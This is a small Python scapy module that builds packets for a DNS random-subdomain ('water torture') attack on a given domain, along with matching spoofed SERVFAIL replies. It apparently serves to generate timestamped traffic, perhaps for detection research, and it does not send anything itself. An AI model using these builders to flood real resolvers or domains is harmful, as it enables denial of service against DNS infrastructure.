from scapy.all import *
import random
import string
import sys


def randomSub():
    """
    Creates a random string. The size is a random number between [10, 30]
    The string doesn't contains "."
    """
    crc = str(string.ascii_letters + string.digits + string.punctuation).replace(".", "")
    n = random.randint(10,30)
    return "".join(random.sample(crc, n))

def randomSubBuilder(dom, ip_dst, src_port, t):
    """
    Random Subdomain attack packet builder
    Param: dom -> Domain that you want to attack
           ip_dest -> Destination ip
           src_port -> Source port
           t -> Arrival time
           return: A packet that has a random string as a subdomain
    """
    id_IP = int(RandShort())
    id_DNS = int(RandShort())
    sub = randomSub()
    q_name = sub + '.' + dom
    ans = Ether()/IP(dst = ip_dst, id = id_IP)/UDP(sport = src_port)/DNS(rd = 0, id= id_DNS, qd=DNSQR(qname=str(q_name)))
    ans.time = t
    return ans

def answerRandSub(p, t):
    """
    """
    id_IP = int(RandShort())
    ans = Ether()/IP(dst = p[IP].src, src = p[IP].dst, id = id_IP)/UDP(dport = p[UDP].sport)/DNS(id = p[DNS].id, qr = 1, rd = 0, cd = 1,rcode = 2, qd = p[DNS].qd)
    return ans
